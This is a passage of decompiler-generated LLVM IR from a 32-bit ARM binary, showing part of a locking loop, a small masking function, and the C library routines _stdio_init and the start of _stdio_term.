  %v3_16178 = load i32, i32* %v2_16178, align 4
  store i32 %v3_16178, i32* %r3.global-to-local, align 4
  %v1_1617c = add i32 %v4_16174, 8
  %v2_1617c = inttoptr i32 %v1_1617c to i32*
  %v3_1617c = load i32, i32* %v2_1617c, align 4
  store i32 %v3_1617c, i32* %r2.global-to-local, align 4
  %v1_16180 = add i32 %v3_16178, 1
  store i32 %v1_16180, i32* %r3.global-to-local, align 4
  %v3_16184 = icmp uge i32 %v3_1617c, %v1_16184
  store i1 %v3_16184, i1* %cpsr_c.global-to-local, align 1
  %v9_16184 = icmp eq i32 %v3_1617c, %v1_16184
  store i32 %v1_16180, i32* %v2_16178, align 4
  br i1 %v9_16184, label %dec_label_pc_161d0, label %dec_label_pc_16190

dec_label_pc_16190:                               ; preds = %dec_label_pc_16168
  %v0_16194 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16194, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1619c95 = inttoptr i32 %v0_16194 to i32*
  %v2_1619c96 = load i32, i32* %v1_1619c95, align 4
  store i32 %v2_1619c96, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_161a098 = icmp eq i32 %v2_1619c96, 0
  br i1 %v9_161a098, label %dec_label_pc_161a8, label %dec_label_pc_161c0

dec_label_pc_161a8:                               ; preds = %dec_label_pc_16190, %dec_label_pc_161a8.dec_label_pc_1619c_crit_edge
  %v0_161a899 = phi i32 [ %v1_161a0.pre, %dec_label_pc_161a8.dec_label_pc_1619c_crit_edge ], [ 0, %dec_label_pc_16190 ]
  store i32 %v0_161a899, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_161b8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_161b8, label %dec_label_pc_161bc, label %dec_label_pc_161a8.dec_label_pc_1619c_crit_edge

dec_label_pc_161a8.dec_label_pc_1619c_crit_edge:  ; preds = %dec_label_pc_161a8
  %v0_1619c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_161a0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1619c = inttoptr i32 %v0_1619c.pre to i32*
  %v2_1619c = load i32, i32* %v1_1619c, align 4
  store i32 %v2_1619c, i32* %r3.global-to-local, align 4
  %v3_161a0 = icmp uge i32 %v2_1619c, %v1_161a0.pre
  store i1 %v3_161a0, i1* %cpsr_c.global-to-local, align 1
  %v9_161a0 = icmp eq i32 %v2_1619c, %v1_161a0.pre
  br i1 %v9_161a0, label %dec_label_pc_161a8, label %dec_label_pc_161c0

dec_label_pc_161bc:                               ; preds = %dec_label_pc_161a8
  %v0_161bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_161bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_161c0

dec_label_pc_161c0:                               ; preds = %dec_label_pc_16190, %dec_label_pc_161a8.dec_label_pc_1619c_crit_edge, %dec_label_pc_161bc
  %v0_161c0 = phi i32 [ %v0_161bc, %dec_label_pc_161bc ], [ %v2_1619c96, %dec_label_pc_16190 ], [ %v2_1619c, %dec_label_pc_161a8.dec_label_pc_1619c_crit_edge ]
  %v1_161c0 = phi i32 [ %v0_161bc, %dec_label_pc_161bc ], [ 0, %dec_label_pc_16190 ], [ %v1_161a0.pre, %dec_label_pc_161a8.dec_label_pc_1619c_crit_edge ]
  %v3_161c0 = icmp uge i32 %v0_161c0, %v1_161c0
  store i1 %v3_161c0, i1* %cpsr_c.global-to-local, align 1
  %v9_161c0 = icmp eq i32 %v0_161c0, %v1_161c0
  br i1 %v9_161c0, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_161c0
  %v1_161c4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_161c4, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_161c0, %bb60
  %v1_161c8 = xor i1 %v9_161c0, true
  call void @__pseudo_cond_branch(i1 %v1_161c8, i32 ptrtoint (i32* @global_var_143ac.505 to i32))
  %v0_161cc = load i32, i32* %r6.global-to-local, align 4
  %v1_161cc = load i32, i32* %r7.global-to-local, align 4
  %v2_161cc = add i32 %v1_161cc, 8
  %v3_161cc = inttoptr i32 %v2_161cc to i32*
  store i32 %v0_161cc, i32* %v3_161cc, align 4
  br label %dec_label_pc_161d0

dec_label_pc_161d0:                               ; preds = %dec_label_pc_16168, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_161d4 = load i32, i32* @r8, align 4
  %v2_161d4 = add i32 %v0_161d4, 152
  %v3_161d4 = inttoptr i32 %v2_161d4 to i32*
  %v4_161d4 = load i32, i32* %v3_161d4, align 4
  store i32 %v4_161d4, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_161dc = add i32 %v0_161d4, 76
  %v3_161dc = inttoptr i32 %v2_161dc to i32*
  %v4_161dc = load i32, i32* %v3_161dc, align 4
  store i32 %v4_161dc, i32* @r1, align 4
  %v1_161e0 = add i32 %v4_161d4, 4
  %v2_161e0 = inttoptr i32 %v1_161e0 to i32*
  %v3_161e0 = load i32, i32* %v2_161e0, align 4
  store i32 %v3_161e0, i32* %r3.global-to-local, align 4
  %v1_161e4 = inttoptr i32 %v4_161dc to i32*
  %v2_161e4 = load i32, i32* %v1_161e4, align 4
  store i32 %v2_161e4, i32* %r2.global-to-local, align 4
  %v1_161e8 = add i32 %v3_161e0, 1
  store i32 %v1_161e8, i32* %r3.global-to-local, align 4
  store i32 %v1_161e8, i32* %v2_161e0, align 4
  %v0_161f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_161f0 = load i32, i32* @r5, align 4
  %v2_161f0 = add i32 %v1_161f0, 32
  %v3_161f0 = inttoptr i32 %v2_161f0 to i32*
  store i32 %v0_161f0, i32* %v3_161f0, align 4
  %v0_161f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_161f4 = add i32 %v0_161f4, 4
  %v2_161f4 = inttoptr i32 %v1_161f4 to i32*
  %v3_161f4 = load i32, i32* %v2_161f4, align 4
  %v1_161f8 = add i32 %v3_161f4, -1
  store i32 %v1_161f8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_161fc = icmp eq i32 %v1_161f8, 0
  %v0_16200 = load i32, i32* @r5, align 4
  %v1_16200 = load i32, i32* @r1, align 4
  %v2_16200 = inttoptr i32 %v1_16200 to i32*
  store i32 %v0_16200, i32* %v2_16200, align 4
  %v0_16204 = load i32, i32* %r3.global-to-local, align 4
  %v1_16204 = load i32, i32* %r0.global-to-local, align 4
  %v2_16204 = add i32 %v1_16204, 4
  %v3_16204 = inttoptr i32 %v2_16204 to i32*
  store i32 %v0_16204, i32* %v3_16204, align 4
  br i1 %v2_161fc, label %dec_label_pc_1620c, label %dec_label_pc_1626c

dec_label_pc_1620c:                               ; preds = %dec_label_pc_161d0
  %v0_1620c = load i32, i32* %r3.global-to-local, align 4
  %v1_1620c = load i32, i32* %r0.global-to-local, align 4
  %v2_1620c = add i32 %v1_1620c, 8
  %v3_1620c = inttoptr i32 %v2_1620c to i32*
  store i32 %v0_1620c, i32* %v3_1620c, align 4
  %v0_16210 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16210, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16214

dec_label_pc_16214:                               ; preds = %dec_label_pc_16244.dec_label_pc_16214_crit_edge, %dec_label_pc_1620c
  %v0_16214 = phi i32 [ %v0_16214.pre, %dec_label_pc_16244.dec_label_pc_16214_crit_edge ], [ %v0_16210, %dec_label_pc_1620c ]
  %v1_16214 = inttoptr i32 %v0_16214 to i32*
  %v2_16214 = load i32, i32* %v1_16214, align 4
  store i32 %v2_16214, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_16214, i32* %r2.global-to-local, align 4
  %v2_1622083 = load i32, i32* %v1_16214, align 4
  store i32 %v2_1622083, i32* %r3.global-to-local, align 4
  %v3_1622485 = icmp uge i32 %v2_1622083, %v2_16214
  store i1 %v3_1622485, i1* %cpsr_c.global-to-local, align 1
  %v9_1622491 = icmp eq i32 %v2_1622083, %v2_16214
  br i1 %v9_1622491, label %dec_label_pc_1622c, label %dec_label_pc_16244

dec_label_pc_1622c:                               ; preds = %dec_label_pc_16214, %dec_label_pc_1622c.dec_label_pc_16220_crit_edge
  %v0_1622c92 = phi i32 [ %v1_16224.pre, %dec_label_pc_1622c.dec_label_pc_16220_crit_edge ], [ %v2_16214, %dec_label_pc_16214 ]
  store i32 %v0_1622c92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1623c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1623c, label %dec_label_pc_16240, label %dec_label_pc_1622c.dec_label_pc_16220_crit_edge

dec_label_pc_1622c.dec_label_pc_16220_crit_edge:  ; preds = %dec_label_pc_1622c
  %v0_16220.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16224.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16220 = inttoptr i32 %v0_16220.pre to i32*
  %v2_16220 = load i32, i32* %v1_16220, align 4
  store i32 %v2_16220, i32* %r3.global-to-local, align 4
  %v3_16224 = icmp uge i32 %v2_16220, %v1_16224.pre
  store i1 %v3_16224, i1* %cpsr_c.global-to-local, align 1
  %v9_16224 = icmp eq i32 %v2_16220, %v1_16224.pre
  br i1 %v9_16224, label %dec_label_pc_1622c, label %dec_label_pc_16244

dec_label_pc_16240:                               ; preds = %dec_label_pc_1622c
  %v0_16240 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16240, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16244

dec_label_pc_16244:                               ; preds = %dec_label_pc_16214, %dec_label_pc_1622c.dec_label_pc_16220_crit_edge, %dec_label_pc_16240
  %v0_1624c = phi i32 [ %v0_16240, %dec_label_pc_16240 ], [ %v2_1622083, %dec_label_pc_16214 ], [ %v2_16220, %dec_label_pc_1622c.dec_label_pc_16220_crit_edge ]
  %v1_16244 = phi i32 [ %v0_16240, %dec_label_pc_16240 ], [ %v2_16214, %dec_label_pc_16214 ], [ %v1_16224.pre, %dec_label_pc_1622c.dec_label_pc_16220_crit_edge ]
  %v3_16244 = icmp uge i32 %v0_1624c, %v1_16244
  store i1 %v3_16244, i1* %cpsr_c.global-to-local, align 1
  %v9_16244 = icmp eq i32 %v0_1624c, %v1_16244
  br i1 %v9_16244, label %dec_label_pc_1624c, label %dec_label_pc_16244.dec_label_pc_16214_crit_edge

dec_label_pc_16244.dec_label_pc_16214_crit_edge:  ; preds = %dec_label_pc_16244
  %v0_16214.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16214

dec_label_pc_1624c:                               ; preds = %dec_label_pc_16244
  %v2_1624c = icmp ne i32 %v1_16244, 0
  store i1 %v2_1624c, i1* %cpsr_c.global-to-local, align 1
  %v7_16250 = icmp slt i32 %v1_16244, 2
  br i1 %v7_16250, label %dec_label_pc_1626c, label %dec_label_pc_16254

dec_label_pc_16254:                               ; preds = %dec_label_pc_1624c
  %v0_16254 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16254, i32* %r0.global-to-local, align 4
  %v0_16258 = load i32, i32* @r1, align 4
  %v1_16258 = add i32 %v0_16258, 129
  store i32 %v1_16258, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1626c

dec_label_pc_1626c:                               ; preds = %dec_label_pc_161d0, %dec_label_pc_16254, %dec_label_pc_1624c
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16270 = load i32, i32* @r8, align 4
  %v2_16270 = add i32 %v0_16270, 160
  %v3_16270 = inttoptr i32 %v2_16270 to i32*
  %v4_16270 = load i32, i32* %v3_16270, align 4
  store i32 %v4_16270, i32* %r0.global-to-local, align 4
  %v1_16274 = add i32 %v4_16270, 4
  %v2_16274 = inttoptr i32 %v1_16274 to i32*
  %v3_16274 = load i32, i32* %v2_16274, align 4
  %v1_16278 = add i32 %v3_16274, -1
  store i32 %v1_16278, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1627c = icmp eq i32 %v1_16278, 0
  store i32 %v1_16278, i32* %v2_16274, align 4
  br i1 %v2_1627c, label %dec_label_pc_16288, label %dec_label_pc_162f0

dec_label_pc_16288:                               ; preds = %dec_label_pc_1626c
  %v0_16288 = load i32, i32* %r3.global-to-local, align 4
  %v1_16288 = load i32, i32* %r0.global-to-local, align 4
  %v2_16288 = add i32 %v1_16288, 8
  %v3_16288 = inttoptr i32 %v2_16288 to i32*
  store i32 %v0_16288, i32* %v3_16288, align 4
  %v0_1628c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1628c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16290

dec_label_pc_16290:                               ; preds = %dec_label_pc_162c0.dec_label_pc_16290_crit_edge, %dec_label_pc_16288
  %v0_16290 = phi i32 [ %v0_16290.pre, %dec_label_pc_162c0.dec_label_pc_16290_crit_edge ], [ %v0_1628c, %dec_label_pc_16288 ]
  %v1_16290 = inttoptr i32 %v0_16290 to i32*
  %v2_16290 = load i32, i32* %v1_16290, align 4
  store i32 %v2_16290, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_16290, i32* %r2.global-to-local, align 4
  %v2_1629c71 = load i32, i32* %v1_16290, align 4
  store i32 %v2_1629c71, i32* %r3.global-to-local, align 4
  %v3_162a073 = icmp uge i32 %v2_1629c71, %v2_16290
  store i1 %v3_162a073, i1* %cpsr_c.global-to-local, align 1
  %v9_162a079 = icmp eq i32 %v2_1629c71, %v2_16290
  br i1 %v9_162a079, label %dec_label_pc_162a8, label %dec_label_pc_162c0

dec_label_pc_162a8:                               ; preds = %dec_label_pc_16290, %dec_label_pc_162a8.dec_label_pc_1629c_crit_edge
  %v0_162a880 = phi i32 [ %v1_162a0.pre, %dec_label_pc_162a8.dec_label_pc_1629c_crit_edge ], [ %v2_16290, %dec_label_pc_16290 ]
  store i32 %v0_162a880, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_162b8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_162b8, label %dec_label_pc_162bc, label %dec_label_pc_162a8.dec_label_pc_1629c_crit_edge

dec_label_pc_162a8.dec_label_pc_1629c_crit_edge:  ; preds = %dec_label_pc_162a8
  %v0_1629c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_162a0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1629c = inttoptr i32 %v0_1629c.pre to i32*
  %v2_1629c = load i32, i32* %v1_1629c, align 4
  store i32 %v2_1629c, i32* %r3.global-to-local, align 4
  %v3_162a0 = icmp uge i32 %v2_1629c, %v1_162a0.pre
  store i1 %v3_162a0, i1* %cpsr_c.global-to-local, align 1
  %v9_162a0 = icmp eq i32 %v2_1629c, %v1_162a0.pre
  br i1 %v9_162a0, label %dec_label_pc_162a8, label %dec_label_pc_162c0

dec_label_pc_162bc:                               ; preds = %dec_label_pc_162a8
  %v0_162bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_162bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_162c0

dec_label_pc_162c0:                               ; preds = %dec_label_pc_16290, %dec_label_pc_162a8.dec_label_pc_1629c_crit_edge, %dec_label_pc_162bc
  %v0_162c8 = phi i32 [ %v0_162bc, %dec_label_pc_162bc ], [ %v2_1629c71, %dec_label_pc_16290 ], [ %v2_1629c, %dec_label_pc_162a8.dec_label_pc_1629c_crit_edge ]
  %v1_162c0 = phi i32 [ %v0_162bc, %dec_label_pc_162bc ], [ %v2_16290, %dec_label_pc_16290 ], [ %v1_162a0.pre, %dec_label_pc_162a8.dec_label_pc_1629c_crit_edge ]
  %v3_162c0 = icmp uge i32 %v0_162c8, %v1_162c0
  store i1 %v3_162c0, i1* %cpsr_c.global-to-local, align 1
  %v9_162c0 = icmp eq i32 %v0_162c8, %v1_162c0
  br i1 %v9_162c0, label %dec_label_pc_162c8, label %dec_label_pc_162c0.dec_label_pc_16290_crit_edge

dec_label_pc_162c0.dec_label_pc_16290_crit_edge:  ; preds = %dec_label_pc_162c0
  %v0_16290.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16290

dec_label_pc_162c8:                               ; preds = %dec_label_pc_162c0
  %v2_162c8 = icmp ne i32 %v1_162c0, 0
  store i1 %v2_162c8, i1* %cpsr_c.global-to-local, align 1
  %v7_162cc = icmp slt i32 %v1_162c0, 2
  br i1 %v7_162cc, label %dec_label_pc_162f0, label %dec_label_pc_162d0

dec_label_pc_162d0:                               ; preds = %dec_label_pc_162c8
  %v0_162d0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_162d0, i32* %r0.global-to-local, align 4
  %v0_162d4 = load i32, i32* @r1, align 4
  %v1_162d4 = add i32 %v0_162d4, 129
  store i32 %v1_162d4, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_162f0

dec_label_pc_162ec:                               ; preds = %dec_label_pc_15f30, %dec_label_pc_15f14, %dec_label_pc_15f3c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_162f0

dec_label_pc_162f0:                               ; preds = %dec_label_pc_1626c, %dec_label_pc_162c8, %bb57, %dec_label_pc_15f74, %dec_label_pc_162d0, %dec_label_pc_162ec
  %v0_162f0 = load i32, i32* @r5, align 4
  store i32 %v0_162f0, i32* %r0.global-to-local, align 4
  %v2_162f8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_162f8, i32* %r4.global-to-local, align 4
  store i32 %v6_15ed4, i32* @r5, align 4
  store i32 %v9_15ed4, i32* @r6, align 4
  store i32 %v12_15ed4, i32* @r7, align 4
  store i32 %v15_15ed4, i32* @r8, align 4
  ret i32 %v0_162f0

; uselistorder directives
  uselistorder i32 %v0_162bc, { 1, 0, 2 }
  uselistorder i32 %v1_162a0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16290, { 1, 0 }
  uselistorder i32 %v0_16240, { 1, 0, 2 }
  uselistorder i32 %v1_16224.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16214, { 1, 0 }
  uselistorder i32 %v0_161bc, { 1, 0, 2 }
  uselistorder i32 %v1_161a0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16154, { 1, 0, 2 }
  uselistorder i32 %v1_16138, { 0, 2, 1 }
  uselistorder i32 %v4_16114, { 2, 1, 0, 3 }
  uselistorder i32 %v1_160c4.pre, { 2, 1, 0 }
  uselistorder i32 %v0_16048, { 1, 2, 0 }
  uselistorder i32 %v1_15fd8, { 1, 0 }
  uselistorder i32 %v0_15fd8, { 1, 0 }
  uselistorder i32 %v1_15fc0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_15f64, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 51, 5, 6, 7, 8, 9, 11, 10, 52, 13, 12, 14, 15, 16, 17, 18, 19, 21, 20, 53, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 50 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 25, 22, 23, 24, 26, 27, 28 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 32, 33, 3, 4, 5, 6, 34, 35, 7, 8, 9, 36, 37, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 16384, { 76, 77, 0, 1, 78, 39, 69, 40, 70, 41, 71, 42, 72, 43, 73, 44, 74, 19, 75, 18, 65, 17, 53, 37, 54, 4, 55, 5, 56, 6, 57, 38, 58, 7, 59, 8, 60, 9, 61, 10, 62, 11, 63, 12, 64, 36, 66, 13, 67, 14, 68, 45, 81, 15, 82, 16, 83, 20, 79, 46, 80, 84, 49, 85, 50, 86, 22, 87, 47, 88, 21, 89, 48, 90, 23, 91, 24, 92, 26, 93, 25, 94, 28, 95, 27, 96, 29, 97, 30, 98, 31, 99, 32, 100, 33, 101, 51, 102, 34, 2, 52, 103, 35, 3 }
  uselistorder i32 (i32, i32*)* @__libc_open, { 0, 8, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 16, 0, 15, 12, 11, 2, 1, 14, 13, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 1024, { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder i32 ()* @malloc, { 43, 42, 41, 4, 3, 2, 0, 1, 7, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @free, { 12, 11, 5, 4, 3, 2, 1, 8, 7, 6, 10, 9, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_162f0, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_162ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_162c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_162a8, { 1, 0 }
  uselistorder label %dec_label_pc_1626c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16244, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1622c, { 1, 0 }
  uselistorder label %dec_label_pc_161d0, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_161c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_161a8, { 1, 0 }
  uselistorder label %dec_label_pc_16168, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_16158, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_160a0, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_16008._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_15fb0, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_15f4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15f14, { 1, 2, 0 }
}

define i32 @function_16304(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16304:
  %v0_16304 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16304, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16304
  %v5_16304 = sdiv i32 %arg2, 16
  %v6_16304 = and i32 %v5_16304, %arg1
  %v5_16308 = sdiv i32 %arg2, 256
  %v6_16308 = and i32 %v6_16304, %v5_16308
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16304, %bb
  %v7_1630c = phi i32 [ %arg1, %dec_label_pc_16304 ], [ %v6_16308, %bb ]
  ret i32 %v7_1630c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_1633c = call i32 @__aeabi_read_tp()
  %v3_16340 = load i16, i16* @global_var_22068.345, align 2
  %v4_16340 = sext i16 %v3_16340 to i32
  store i32 %v4_16340, i32* @r3, align 4
  store i32 %v0_1633c, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_1634c = add i32 %v4_16340, %v0_1633c
  %v3_1634c = inttoptr i32 %v2_1634c to i32*
  %v4_1634c = load i32, i32* %v3_1634c, align 4
  store i32 %v4_1634c, i32* @r6, align 4
  %v1_16350 = call i32 @isatty(i32 0)
  %v2_16358 = icmp eq i32 %v1_16350, 0
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r4, align 4
  br i1 %v2_16358, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_16364 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 308) to i16*), align 4
  %v7_16364 = zext i16 %v5_16364 to i32
  %v2_16368 = xor i32 %v7_16364, 256
  store i32 %v2_16368, i32* @r3, align 4
  %v2_1636c = trunc i32 %v2_16368 to i16
  store i16 %v2_1636c, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 308) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_16374 = call i32 @isatty(i32 1)
  %v2_16378 = icmp eq i32 %v1_16374, 0
  br i1 %v2_16378, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_16380 = load i32, i32* @r4, align 4
  %v2_16384 = add i32 %v1_16380, 376
  %v3_16384 = inttoptr i32 %v2_16384 to i16*
  %v4_16384 = load i16, i16* %v3_16384, align 2
  %v2_16388 = xor i16 %v4_16384, 256
  store i16 %v2_16388, i16* %v3_16384, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_16394 = load i16, i16* @global_var_22068.345, align 2
  %v4_16394 = sext i16 %v3_16394 to i32
  %v0_16398 = load i32, i32* @r6, align 4
  %v1_16398 = load i32, i32* @r5, align 4
  %v3_16398 = add i32 %v1_16398, %v4_16394
  %v4_16398 = inttoptr i32 %v3_16398 to i32*
  store i32 %v0_16398, i32* %v4_16398, align 4
  ret i32 %v1_16374

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_163b4 = load i32, i32* @r4, align 4
  store i32 %v3_163b4, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 -33548), i32* %r3.global-to-local, align 4
  %v2_163c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 -33548) to i32*), align 4
  store i32 %v2_163c8, i32* %r0.global-to-local, align 4
  %v5_163c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 -33544) to i32*), align 4
  store i32 %v5_163c8, i32* %r1.global-to-local, align 4
  %v8_163c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 -33540) to i32*), align 4
  %v2_163d0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_163d0, i32* %r3.global-to-local, align 4
  store i32 %v2_163c8, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_163dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 152) to i32*), align 4
  store i32 %v2_163c8, i32* %r0.global-to-local, align 4
  store i32 %v5_163c8, i32* %r1.global-to-local, align 4
  store i32 %v8_163c8, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 -33560), i32* %r3.global-to-local, align 4
  %v1_163ec = inttoptr i32 %v4_163dc to i32*
  store i32 %v2_163c8, i32* %v1_163ec, align 4
  %v3_163ec = add i32 %v4_163dc, 4
  %v4_163ec = inttoptr i32 %v3_163ec to i32*
  %v5_163ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_163ec, i32* %v4_163ec, align 4
  %v6_163ec = add i32 %v4_163dc, 8
  %v7_163ec = inttoptr i32 %v6_163ec to i32*
  %v8_163ec = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_163ec, i32* %v7_163ec, align 4
  %v0_163f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_163f0 = inttoptr i32 %v0_163f0 to i32*
  %v2_163f0 = load i32, i32* %v1_163f0, align 4
  store i32 %v2_163f0, i32* %r0.global-to-local, align 4
  %v3_163f0 = add i32 %v0_163f0, 4
  %v4_163f0 = inttoptr i32 %v3_163f0 to i32*
  %v5_163f0 = load i32, i32* %v4_163f0, align 4
  store i32 %v5_163f0, i32* %r1.global-to-local, align 4
